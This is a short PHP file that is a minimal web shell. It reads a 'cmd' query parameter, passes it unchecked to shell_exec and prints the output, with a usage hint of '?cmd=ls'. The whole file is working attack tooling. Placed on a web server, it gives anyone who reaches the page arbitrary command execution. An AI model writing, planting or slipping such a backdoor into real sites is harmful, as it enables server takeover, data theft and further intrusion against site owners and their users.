<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
} else {
    echo "Usage: ?cmd=ls";
}
?>
